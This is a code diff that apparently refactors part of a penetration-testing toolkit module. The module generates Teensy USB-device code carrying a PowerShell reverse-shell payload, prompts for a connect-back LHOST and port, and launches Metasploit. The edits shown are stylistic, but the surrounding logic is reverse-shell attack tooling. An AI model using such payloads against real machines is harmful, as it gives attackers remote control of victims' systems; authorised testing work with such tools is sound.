@@ -37,9 +37,8 @@ with open(os.path.join(core.userconfigpath, 'x86.powershell'), 'w') as filewrite
 
 time.sleep(3)
 with open(os.path.join(core.userconfigpath, "x86.powershell")) as fileopen:
-    pass
     # read in x amount of bytes
-    data_read = int(50)
+    data_read = 50
 
     output_variable = "#define __PROG_TYPES_COMPAT__\n#include <avr/pgmspace.h>\n"
 
@@ -57,11 +56,7 @@ output_variable += "const char * exploit[] = {\n"
 while rev_counter != counter:
     output_variable += "RevShell_{0}".format(rev_counter)
     rev_counter += 1
-    if rev_counter == counter:
-        output_variable += "};\n"
-    else:
-        output_variable += ",\n"
-
+    output_variable += "};\n" if rev_counter == counter else ",\n"
 teensy = output_variable
 
 # write the rest of the teensy code
@@ -165,7 +160,7 @@ if choice == "YES":
         ipaddr = core.check_options("IPADDR=")
     else:
         ipaddr = input("LHOST IP address to connect back on: ")
-        core.update_options("IPADDR=" + ipaddr)
+        core.update_options(f"IPADDR={ipaddr}")
 
     if core.check_options("PORT=") != 0:
         port = core.check_options("PORT=")
@@ -183,8 +178,12 @@ if choice == "YES":
 
     print("[*] Launching Metasploit....")
     try:
-        child = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(core.meta_path() + "msfconsole"),
-                                                          os.path.join(core.userconfigpath, "metasploit.answers")))
+        child = pexpect.spawn(
+            "{0} -r {1}\r\n\r\n".format(
+                os.path.join(f"{core.meta_path()}msfconsole"),
+                os.path.join(core.userconfigpath, "metasploit.answers"),
+            )
+        )
         child.interact()
     except:
         pass
